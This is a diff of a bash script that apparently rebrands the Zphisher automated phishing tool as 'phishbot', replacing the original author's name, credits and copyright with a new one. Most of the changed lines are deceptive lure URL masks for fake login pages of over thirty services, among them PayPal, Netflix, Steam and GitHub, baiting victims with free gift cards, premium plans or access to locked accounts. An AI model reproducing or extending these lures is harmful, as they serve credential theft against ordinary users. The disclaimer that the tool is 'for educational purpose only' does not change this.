@@ -1,19 +1,11 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
+##   phishbot 	: 	Automated Phishing Tool
+##   Author 	: 	Legion_MRX 
+##   Version 	: 	1.1
+##   Github 	: 	https://github.com/Mrxlegion/
 
-##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
-##   1RaY-1 - https://github.com/1RaY-1
-##   Moises Tapia - https://github.com/MoisesTapia
-##   TheLinuxChoice - https://twitter.com/linux_choice
-##   DarksecDevelopers  - https://github.com/DarksecDevelopers
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
+
 
 
 ## If you Copy Then Give the credits :)
@@ -90,7 +82,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
+##      Copyright (C) 2021  Legion_MRX (https://github.com/Mrxlegion)
 ##
 
 
@@ -152,27 +144,28 @@ kill_pid() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+                ${ORANGE}┏━━━┳┓╋╋╋╋╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋┏┓
+                         ┃┏━┓┃┃╋╋╋╋╋┃┃╋╋╋╋╋╋┃┃╋╋╋┏┛┗┓
+                         ┃┗━┛┃┗━┳┳━━┫┗━┳━━┳━┫┗━┳━┻┓┏┛
+                         ┃┏━━┫┏┓┣┫━━┫┏┓┃┃━┫┏┫┏┓┃┏┓┃┃
+                         ┃┃╋╋┃┃┃┃┣━━┃┃┃┃┃━┫┃┃┗┛┃┗┛┃┗┓
+                         ┗┛╋╋┗┛┗┻┻━━┻┛┗┻━━┻┛┗━━┻━━┻━┛
+		                                    ${RED}Version :1.1
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Legion_MRX(MANISH)${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+                ${ORANGE}┏━━━┳┓╋╋╋╋╋┏┓╋╋╋╋╋╋┏┓╋╋╋╋┏┓
+                         ┃┏━┓┃┃╋╋╋╋╋┃┃╋╋╋╋╋╋┃┃╋╋╋┏┛┗┓
+                         ┃┗━┛┃┗━┳┳━━┫┗━┳━━┳━┫┗━┳━┻┓┏┛
+                         ┃┏━━┫┏┓┣┫━━┫┏┓┃┃━┫┏┫┏┓┃┏┓┃┃
+                         ┃┃╋╋┃┃┃┃┣━━┃┃┃┃┃━┫┃┃┗┛┃┗┛┃┗┓
+                         ┗┛╋╋┗┛┗┻┻━━┻┛┗┻━━┻┛┗━━┻━━┻━┛
+		                                    ${RED}Version :1.1
 	EOF
 }
 
@@ -303,13 +296,11 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN}Author   ${RED}:  ${ORANGE}LEGION_MRX${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Mrxlegion/
+		${GREEN}Version  ${RED}:  ${ORANGE}1.1
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
+		${REDBG}${WHITE} Thanks : Legion_Mrx ${RESETBG}
 
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
@@ -626,71 +617,71 @@ main_menu() {
 			site_gmail;;
 		4 | 04)
 			website="microsoft"
-			mask='http://unlimited-onedrive-space-for-free'
+			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
 		5 | 05)
 			website="netflix"
-			mask='http://upgrade-your-netflix-plan-free'
+			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
 		6 | 06)
 			website="paypal"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		7 | 07)
 			website="steam"
-			mask='http://steam-500-usd-gift-card-free'
+			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
 		8 | 08)
 			website="twitter"
-			mask='http://get-blue-badge-on-twitter-free'
+			mask='https://get-blue-badge-on-twitter-free'
 			tunnel_menu;;
 		9 | 09)
 			website="playstation"
-			mask='http://playstation-500-usd-gift-card-free'
+			mask='https://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
 		10)
 			website="tiktok"
-			mask='http://tiktok-free-liker'
+			mask='https://tiktok-free-liker'
 			tunnel_menu;;
 		11)
 			website="twitch"
-			mask='http://unlimited-twitch-tv-user-for-free'
+			mask='https://unlimited-twitch-tv-user-for-free'
 			tunnel_menu;;
 		12)
 			website="pinterest"
-			mask='http://get-a-premium-plan-for-pinterest-free'
+			mask='http:s//get-a-premium-plan-for-pinterest-free'
 			tunnel_menu;;
 		13)
 			website="snapchat"
-			mask='http://view-locked-snapchat-accounts-secretly'
+			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
 		14)
 			website="linkedin"
-			mask='http://get-a-premium-plan-for-linkedin-free'
+			mask='https://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
 		15)
 			website="ebay"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		16)
 			website="quora"
-			mask='http://quora-premium-for-free'
+			mask='https://quora-premium-for-free'
 			tunnel_menu;;
 		17)
 			website="protonmail"
-			mask='http://protonmail-pro-basics-for-free'
+			mask='https://protonmail-pro-basics-for-free'
 			tunnel_menu;;
 		18)
 			website="spotify"
-			mask='http://convert-your-account-to-spotify-premium'
+			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
 		19)
 			website="reddit"
-			mask='http://reddit-official-verified-member-badge'
+			mask='https://reddit-official-verified-member-badge'
 			tunnel_menu;;
 		20)
 			website="adobe"
-			mask='http://get-adobe-lifetime-pro-membership-free'
+			mask='https://get-adobe-lifetime-pro-membership-free'
 			tunnel_menu;;
 		21)
 			website="deviantart"
@@ -698,49 +689,49 @@ main_menu() {
 			tunnel_menu;;
 		22)
 			website="badoo"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		23)
 			website="origin"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		24)
 			website="dropbox"
-			mask='http://get-1TB-cloud-storage-free'
+			mask='https://get-1TB-cloud-storage-free'
 			tunnel_menu;;
 		25)
 			website="yahoo"
-			mask='http://grab-mail-from-anyother-yahoo-account-free'
+			mask='https://grab-mail-from-anyother-yahoo-account-free'
 			tunnel_menu;;
 		26)
 			website="wordpress"
-			mask='http://unlimited-wordpress-traffic-free'
+			mask='https://unlimited-wordpress-traffic-free'
 			tunnel_menu;;
 		27)
 			website="yandex"
-			mask='http://grab-mail-from-anyother-yandex-account-free'
+			mask='https://grab-mail-from-anyother-yandex-account-free'
 			tunnel_menu;;
 		28)
 			website="stackoverflow"
-			mask='http://get-stackoverflow-lifetime-pro-membership-free'
+			mask='https://get-stackoverflow-lifetime-pro-membership-free'
 			tunnel_menu;;
 		29)
 			site_vk;;
 		30)
 			website="xbox"
-			mask='http://get-500-usd-free-to-your-acount'
+			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
 		31)
 			website="mediafire"
-			mask='http://get-1TB-on-mediafire-free'
+			mask='https://get-1TB-on-mediafire-free'
 			tunnel_menu;;
 		32)
 			website="gitlab"
-			mask='http://get-1k-followers-on-gitlab-free'
+			mask='https://get-1k-followers-on-gitlab-free'
 			tunnel_menu;;
 		33)
 			website="github"
-			mask='http://get-1k-followers-on-github-free'
+			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
 		99)
 			about;;
